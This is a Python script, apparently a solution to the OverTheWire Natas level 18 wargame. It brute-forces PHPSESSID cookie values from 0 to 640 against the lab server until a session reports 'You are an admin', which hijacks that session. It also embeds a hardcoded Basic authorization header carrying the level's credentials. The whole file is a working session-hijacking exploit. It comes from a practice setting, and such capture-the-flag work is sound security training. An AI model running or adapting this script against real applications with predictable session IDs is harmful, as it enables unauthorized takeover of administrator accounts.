#!/bin/python3
# Description: Script to brute-force PHPSESSID

import requests

from requests.auth import HTTPBasicAuth
from time import sleep


# Initialize Variables
url = 'http://natas18.natas.labs.overthewire.org/'
data = {"username": "admin", "password": "password"}
auth = "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="

for i in range(0, 641):
    # set cookie
    headers = {"Cookie": "PHPSESSID={0}".format(i), "Authorization": "{0}".\
            format(auth)}
    r = requests.post(url, data=data, headers=headers)
    print("Trying session: %d " % i, end="\r")
    sleep(1)
    if "You are an admin" in r.text:
        # uncomment to print PHPSESSID
        # print("Found Session: %d \n" % i)
        print("\n")
        print(r.text)
        break
